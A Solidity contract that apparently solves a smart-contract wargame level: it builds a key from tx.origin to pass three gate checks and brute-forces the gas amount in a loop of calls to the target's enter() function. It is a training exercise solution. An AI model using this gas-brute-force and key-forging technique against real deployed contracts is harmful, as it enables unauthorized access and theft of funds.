// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract GatekeeperOneCaller {
    function callEnter(address _gatekeeperOne) public {
        bytes8 gateKey = _computeKey();

        for (uint256 i; i < 8191; i++) {
            uint256 gasValue = i + (8191 * 3);

            (bool success,) = _gatekeeperOne.call{gas: gasValue}(abi.encodeWithSignature("enter(bytes8)", gateKey));

            if (success) {
                break;
            }
        }
    }

    function _computeKey() internal view returns (bytes8) {
        // gateThree requires a key with this shape:
        // 0x????????0000XXXX
        //
        // - the lower 4 bytes must equal the lower 2 bytes
        // - the full 8 bytes must be different from the lower 4 bytes
        // - the last 2 bytes must match the last 2 bytes of tx.origin

        // Put a non-zero value in the top 4 bytes so that
        // uint32(uint64(_gateKey)) != uint64(_gateKey)
        uint64 firstPart = uint64(0x12345678) << 32;

        // Extract the last 2 bytes of tx.origin
        // Example:
        // 0xf511E1029dE5295f6D0dE05f4431DdA203e63607 -> 0x3607
        uint64 lastPart = uint64(uint16(uint160(tx.origin)));

        // Combine the two parts to get:
        // 0x1234567800003607
        return bytes8(firstPart | lastPart);
    }
}
